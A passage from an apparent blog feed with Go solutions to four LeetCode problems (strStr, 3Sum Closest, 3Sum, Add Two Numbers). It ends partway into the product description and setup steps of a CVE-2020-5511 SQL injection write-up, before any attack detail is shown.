    <updated>2021-01-23T08:48:32.600Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-28-实现-strStr"><a href="#leetcode题库-28-实现-strStr" class="headerlink" title="leetcode题库 28. 实现 strStr()"></a>leetcode题库 28. 实现 strStr()</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/implement-strstr/">https://leetcode-cn.com/problems/implement-strstr/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>简单</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>实现 strStr() 函数。<br>给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回  -1。</p></blockquote><blockquote><p>示例 1:<br>输入: haystack = “hello”, needle = “ll”<br>输出: 2</p></blockquote><blockquote><p>######示例 2:<br>输入: haystack = “aaaaa”, needle = “bba”<br>输出: -1</p></blockquote><blockquote><p>说明:<br>当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。<br>对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与C语言的 strstr() 以及 Java的 indexOf() 定义相符。</p></blockquote><hr><h4 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h4><blockquote><p>字符串整行匹配</p></blockquote><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strStr</span><span class="params">(haystack <span class="keyword">string</span>, needle <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">i:=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line"><span class="keyword">if</span> i&gt; <span class="built_in">len</span>(haystack) || <span class="built_in">len</span>(haystack[i:])&lt; <span class="built_in">len</span>(needle)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> haystack[i:i+<span class="built_in">len</span>(needle)]==needle &#123;</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon28">https://github.com/lennon-liu/leetcode/tree/main/lennon28</a></p><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon28/lennon28.png" alt="lennon28"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-28-实现-strStr&quot;&gt;&lt;a href=&quot;#leetcode题库-28-实现-strStr&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 28. 实现 strStr()&quot;&gt;&lt;/a&gt;leetcode题库 28.</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="简单难度" scheme="https://lennon.work/tags/%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="字符串" scheme="https://lennon.work/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>16. 最接近的三数之和</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode16/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode16/</id>
    <published>2021-04-11T14:58:54.390Z</published>
    <updated>2021-01-24T11:41:28.470Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-16-最接近的三数之和"><a href="#leetcode题库-16-最接近的三数之和" class="headerlink" title="leetcode题库 16. 最接近的三数之和"></a>leetcode题库 16. 最接近的三数之和</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/3sum-closest/">https://leetcode-cn.com/problems/3sum-closest/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>中等</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。<br>返回这三个数的和。假定每组输入只存在唯一答案。</p></blockquote><blockquote><p>示例 1：<br>输入：nums = [-1,2,1,-4], target = 1<br> 输出：2<br> 解释：与 target 最接近的和是 2 (-1 + 2 + 1 = 2) 。</p></blockquote><blockquote><p>提示：<br>3 &lt;= nums.length &lt;= 10^3<br>-10^3 &lt;= nums[i] &lt;= 10^3<br>-10^4 &lt;= target &lt;= 10^4</p></blockquote><h4 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h4><blockquote><p>暴力遍历前两个数，在寻找第三个数，直接第三个数常规遍历会超时，因此得加入限制条件才可以。<br>最好先对数组排序,好处是可以在合适的位置跳出循环，减少没有必要的遍历。<br>对排序好的数组，最好使用二分法查找</p></blockquote><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">twodivde</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line"><span class="comment">//fmt.Println(nums)</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(nums)==<span class="number">2</span>&#123;</span><br><span class="line"><span class="keyword">if</span> math.Abs(<span class="keyword">float64</span>(nums[<span class="number">0</span>]-target))-math.Abs(<span class="keyword">float64</span>(nums[<span class="number">1</span>]-target))&gt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">return</span> nums[<span class="number">1</span>]</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">length:= <span class="built_in">len</span>(nums)<span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> length%<span class="number">2</span>==<span class="number">0</span>&#123;</span><br><span class="line">length=length/<span class="number">2</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">length=(length<span class="number">-1</span>)/<span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> target == nums[length]&#123;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> target &gt; nums[length]&#123;</span><br><span class="line"><span class="keyword">return</span> twodivde(nums[length:],target)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> twodivde(nums[:length+<span class="number">1</span>],target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">threeSumClosest</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">result:=<span class="number">0</span></span><br><span class="line">lastx:=<span class="keyword">float64</span>(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">ttt:=<span class="number">0</span></span><br><span class="line">sort.Ints(nums)</span><br><span class="line"><span class="keyword">for</span> i1 := <span class="number">0</span>;i1&lt;=<span class="built_in">len</span>(nums)<span class="number">-3</span>;i1++&#123;</span><br><span class="line">lastnum3:=<span class="number">9999</span></span><br><span class="line"><span class="keyword">for</span> i2:=i1+<span class="number">1</span>;i2&lt;=<span class="built_in">len</span>(nums)<span class="number">-2</span>;i2++&#123;</span><br><span class="line">num3:=(target-nums[i1])-nums[i2]</span><br><span class="line"><span class="keyword">if</span> num3&gt;nums[<span class="built_in">len</span>(nums)<span class="number">-1</span>]&#123;</span><br><span class="line">ttt= nums[<span class="built_in">len</span>(nums)<span class="number">-1</span>]+nums[i2]+nums[i1]</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> num3&lt;nums[i2+<span class="number">1</span>]&#123;</span><br><span class="line">ttt= nums[i2+<span class="number">1</span>]+nums[i2]+nums[i1]</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">ttt=twodivde(nums,num3)+nums[i2]+nums[i1]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ttt-target==<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">return</span> ttt</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> math.Abs(<span class="keyword">float64</span>(ttt-target))-math.Abs(lastx)&lt;<span class="number">0</span>&#123;</span><br><span class="line">lastx=<span class="keyword">float64</span>(ttt-target)</span><br><span class="line">result=ttt</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ttt-target&gt;<span class="number">0</span> &amp;&amp; ttt-lastnum3&gt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">lastnum3=ttt</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon16">https://github.com/lennon-liu/leetcode/tree/main/lennon16</a></p></blockquote><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon16/lennon16.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote></blockquote><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-16-最接近的三数之和&quot;&gt;&lt;a href=&quot;#leetcode题库-16-最接近的三数之和&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 16. 最接近的三数之和&quot;&gt;&lt;/a&gt;leetcode题库 16. 最接近的</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="中等难度" scheme="https://lennon.work/tags/%E4%B8%AD%E7%AD%89%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="字符串" scheme="https://lennon.work/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>15. 三数之和</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode15/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode15/</id>
    <published>2021-04-11T14:58:54.389Z</published>
    <updated>2021-01-24T11:41:28.450Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-15-三数之和"><a href="#leetcode题库-15-三数之和" class="headerlink" title="leetcode题库 15. 三数之和"></a>leetcode题库 15. 三数之和</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/3sum/">https://leetcode-cn.com/problems/3sum/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>中等</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？请你找出所有和为 0 且不重复的三元组。<br>注意：答案中不可以包含重复的三元组。</p></blockquote><blockquote><p>示例 1：</p></blockquote><blockquote><p>输入：nums = [-1,0,1,2,-1,-4]<br>输出：[[-1,-1,2],[-1,0,1]]<br>示例 2：</p></blockquote><blockquote><p>输入：nums = []<br>输出：[]<br>示例 3：</p></blockquote><blockquote><p>输入：nums = [0]<br>输出：[]</p></blockquote><blockquote><p>提示：<br>0 &lt;= nums.length &lt;= 3000<br>-105 &lt;= nums[i] &lt;= 105</p></blockquote><h4 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h4><blockquote><p>这个题比较容易超时，因为提交测试数组长度较长，在使用常规遍历后，加入多条件终止循环从而减少没有必要的遍历，办法上属于比较笨的办法。</p></blockquote><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">threeSum</span><span class="params">(nums []<span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">result:=[][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">sort.Ints(nums)</span><br><span class="line">temp:=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> index:=<span class="number">0</span>;index&lt;<span class="built_in">len</span>(nums)<span class="number">-2</span>;index+=<span class="number">1</span>&#123;</span><br><span class="line"><span class="keyword">if</span> nums[index]&gt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> temp==nums[index]&#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">temp=nums[index]</span><br><span class="line">&#125;</span><br><span class="line">temp2:=<span class="number">100000</span></span><br><span class="line"><span class="keyword">for</span> index2:=index+<span class="number">1</span>;index2&lt;<span class="built_in">len</span>(nums)<span class="number">-1</span>;index2+=<span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">if</span> nums[index]+nums[index2]&gt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> nums[index]+nums[index2]+nums[<span class="built_in">len</span>(nums)<span class="number">-1</span>]&lt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> temp2==nums[index2]&#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">temp2=nums[index2]</span><br><span class="line">&#125;</span><br><span class="line">temp3:=<span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> index3:=<span class="built_in">len</span>(nums)<span class="number">-1</span>;index3&gt;index2;index3-=<span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">if</span> nums[index]+nums[index2]+nums[index3]&lt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> nums[index3]&lt;<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> temp3==nums[index3]&#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">temp3=nums[index3]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> nums[index]+nums[index2]+nums[index3]==<span class="number">0</span>&#123;</span><br><span class="line">temp:=[]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">temp=<span class="built_in">append</span>(temp, nums[index],nums[index2],nums[index3])</span><br><span class="line">result=<span class="built_in">append</span>(result, temp)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon15">https://github.com/lennon-liu/leetcode/tree/main/lennon15</a></p></blockquote><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon15/lennon15.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote><p>显然这不是一个好方法、具有极大的优化空间</p></blockquote><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-15-三数之和&quot;&gt;&lt;a href=&quot;#leetcode题库-15-三数之和&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 15. 三数之和&quot;&gt;&lt;/a&gt;leetcode题库 15. 三数之和&lt;/h3&gt;&lt;hr&gt;
&lt;h</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="中等难度" scheme="https://lennon.work/tags/%E4%B8%AD%E7%AD%89%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="字符串" scheme="https://lennon.work/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>leetcode题库 2.两数相加</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode02/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode02/</id>
    <published>2021-04-11T14:58:54.387Z</published>
    <updated>2021-01-23T08:48:40.440Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-2-两数相加"><a href="#leetcode题库-2-两数相加" class="headerlink" title="leetcode题库 2.两数相加"></a>leetcode题库 2.两数相加</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/add-two-numbers/">https://leetcode-cn.com/problems/add-two-numbers/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>中等</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p></blockquote><p><img src="/img/lennon2/example1.png" alt="example1"></p><blockquote><p>提示：<br>每个链表中的节点数在范围 [1, 100] 内<br>0 &lt;= Node.val &lt;= 9<br>题目数据保证列表表示的数字不含前导零</p></blockquote><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote></blockquote><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTwoNumbers</span><span class="params">(l1 *ListNode, l2 *ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">listNode := <span class="built_in">new</span>(ListNode)</span><br><span class="line">temp := listNode</span><br><span class="line"><span class="keyword">if</span> l1 != <span class="literal">nil</span> &#123;</span><br><span class="line">temp.Val += l1.Val</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> l2 != <span class="literal">nil</span> &#123;</span><br><span class="line">temp.Val += l2.Val</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">tnextnode := <span class="built_in">new</span>(ListNode)</span><br><span class="line"><span class="keyword">if</span> temp.Val &gt; <span class="number">9</span> &#123;</span><br><span class="line">temp.Val = temp.Val - <span class="number">10</span></span><br><span class="line">tnextnode.Val = <span class="number">1</span></span><br><span class="line">temp.Next = tnextnode</span><br><span class="line">temp = tnextnode</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> l1.Next == <span class="literal">nil</span> &amp;&amp; l2.Next == <span class="literal">nil</span> &#123;</span><br><span class="line">temp.Next = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">temp.Next = tnextnode</span><br><span class="line">temp = tnextnode</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> l1.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">l1 = l1.Next</span><br><span class="line">temp.Val += l1.Val</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> l2.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">l2 = l2.Next</span><br><span class="line">temp.Val += l2.Val</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> listNode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon2">https://github.com/lennon-liu/leetcode/tree/main/lennon2</a></p></blockquote><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon2/lennon2.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote></blockquote><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-2-两数相加&quot;&gt;&lt;a href=&quot;#leetcode题库-2-两数相加&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 2.两数相加&quot;&gt;&lt;/a&gt;leetcode题库 2.两数相加&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="中等难度" scheme="https://lennon.work/tags/%E4%B8%AD%E7%AD%89%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="链表" scheme="https://lennon.work/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHPGurukul Small CRM SQL注入漏洞</title>
    <link href="https://lennon.work/2021/04/11/cve/CVE-2020-5511/"/>
    <id>https://lennon.work/2021/04/11/cve/CVE-2020-5511/</id>
    <published>2021-04-11T14:58:54.384Z</published>
    <updated>2021-01-11T12:14:24.555Z</updated>
    
    <content type="html"><![CDATA[<hr><h4 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h4><p>PHPGurukul Small CRM是一套客户关系管理系统。</p><hr><p>系统详情</p><p><strong>Language Used</strong>          : PHP</p><p><strong>Database                :</strong> MySQL</p><p><strong>User Interface Design</strong> :PHP 5.6 or above , MYSQL, HTML,CSS, JAVASCRIPT, JQUERY, AJAX</p><p><strong>Web Browser            :</strong> Mozilla, Google Chrome, IE8, OPERA</p><p><strong>Software                :</strong> XAMPP / Wamp / Mamp/ Lamp (anyone)</p><hr><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>​    系统下载：<a href="https://phpgurukul.com/?smd_process_download=1&amp;download_id=10412">https://phpgurukul.com/?smd_process_download=1&amp;download_id=10412</a></p><p>安装步骤：</p><ol><li><p>下载压缩包文件</p></li><li><p>解压文件拷贝crm 文件夹</p></li><li><p>粘贴到根目录(for xampp xampp/htdocs, for wamp wamp/www, for lamp var/www/html)</p></li><li><p>打开phpmyadmin (<a href="http://localhost/phpmyadmin">http://localhost/phpmyadmin</a>)</p></li><li><p>创建 